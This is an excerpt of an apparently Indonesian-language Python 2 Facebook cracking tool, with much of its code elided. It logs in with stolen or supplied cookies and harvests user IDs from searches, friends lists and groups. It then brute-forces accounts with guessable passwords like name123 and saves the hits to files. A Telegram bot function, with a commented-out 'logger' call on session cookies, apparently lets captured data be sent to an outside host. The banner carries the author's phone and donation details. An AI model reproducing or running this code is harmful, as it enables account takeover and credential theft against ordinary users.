...
def lang(cookies):
	...
	if f==True:
		...
		exit("* login mungkin gagal. atau akun anda cp")


def gen(show=True):
	if show==True:
		print("* login fb anda melalui cookies")
		print("* cara ambil cookies: https://youtu.be/OlQZJXtBQEQ")
	ck=raw_input("?: cookie: ")
	...
	try:
		...
		if lang(cks)==True:
			open(".cok","w").write(ck)
			exit("* login berhasil, jalankan ulang tools.")
...
class dump_grup:
	...
	def choice(self, whitelist):
		try:
			self.listed=whitelist[input("* pilih group: ")-1]
			self.f()
	...
	def dumps(self, url):
		r=bs4.BeautifulSoup(
			requests.get(url,cookies=self.cookies,
		headers=hdcok()).text,"html.parser")
		print("\r+ dump: %s .. tekan ctrl+z untuk stop"%len(open(self.fl).read().splitlines())),;sys.stdout.flush()
		...
		exit("\n* berhasil mengambil %s id from group %s..."%(len(open(self.fl).read().splitlines()),self.listed.get("name")[0:20]))
	...
	def dump(self, ok):
		...
		for i in r.find_all("a",href=True):
			if "fref" in i.get("href"):
				print("\r* dump (%s)/(%s) .. tekan ctrl+z untuk stop"%(len(open(self.fl).read().splitlines()),self.b)),;sys.stdout.flush()
		...
		exit("\n+ berhasil mengambil %s %s friends, output saved to %s."%(len(open(self.fl).read().splitlines()),self.nitel,self.fl))
...
def sends(pesan,token):
	b=requests.post("https://api.telegram.org/bot"+token+"/sendMessage",data={"chat_id":"0","text":pesan})	
...
class crack:
	def __init__(self,show=True):
		...
		if show==True:
			print("\n\t[ SELECT ACTION ]\n")
			print("  1. Crack Manual Password.")
			print("  2. Langsung Crack (name123,name12345)\n")
		while True:
			f=raw_input("? opsi: ")
			if f=="":continue
			elif f=="1":
				...
				print "+: akun berhasil tersimpan ke: multiresult.txt"
				print "+: akun cp tersimpan ke: checkpoint.txt"
...
#					ceks(log.get("cookies"),ko) # --> skip logger
			...
			self.ko+=1
			print "\r[Crack] %s/%s - berhasil-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
...
def search(fl,r,b):
	...
	for i in b.find_all("a",href=True):
		print "\r[GET]: %s id... tekan ctrl+z untuk stop"%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
...
def dumpfl():
	...
	if len(bs4.re.findall("logout",r)) !=0:
		...
		fl=raw_input("?: namafile: ").replace(" ","_")
		s=raw_input("?: cari nama: ")
		search(
			fl,cvds,
...
\033[0;92AAUTHOR:JOHN NOPRENDI MANIHURUK\033[0;39m\n
\033[0;92JJANGAN LUPA DONASI CUK DANA: 085763584583\033[0;39m\n
\033[0;92FFB: fb.com/ItsReal.JohnManihuruk.SL\033[0;39m\n
\033[0;92WWA: 085763584583\033[0;39m\n
——————————————————————————————————
...
while True:
	print "  [1] Ambil id lewat Pencarian Nama"
	print "  [2] Ambil id lewat Teman Publik"
	print "  [3] Ambil id lewat Grub"
	print "  [4] Ambil id Lewat Pesan"
	print "  [5] Crack"
	print "  [6] keluar akun.\n"
